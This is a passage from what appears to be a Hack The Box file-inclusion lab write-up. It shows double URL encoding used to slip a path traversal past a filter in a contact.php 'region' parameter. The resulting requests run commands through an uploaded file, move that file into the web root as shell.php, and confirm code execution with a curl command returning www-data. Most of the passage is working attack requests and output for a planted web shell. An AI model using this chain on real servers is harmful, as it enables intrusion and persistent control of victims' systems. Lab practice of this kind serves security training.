3. Double Encode: Change the `%` to `%25` → `%252e`

**Example: The Forward Slash (`/`)**

1. Original Character: `/`
2. Single Encode: `%2f`
3. Double Encode: Change the `%` to `%25` → `%252f`

```php
GET /contact.php?region=%252e%252e%252fuploads%252ffcb513f761ea59d2e6c1e6ab120ca650&cmd=id
```

 ![ALT](/HTB/Web_Penetration_Tester/File_Inclusion/Images/s6.png)

we can also mv the web shell to the website directory 

```bash
GET /contact.php?region=%252e%252e%252fuploads%252ffcb513f761ea59d2e6c1e6ab120ca650&cmd=mv+uploads/fcb513f761ea59d2e6c1e6ab120ca650.php+shell.php
```

and with that we have obtained a complete webshell on the website. 

```bash
$ curl "http://154.57.164.78:32440/shell.php?cmd=id"    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```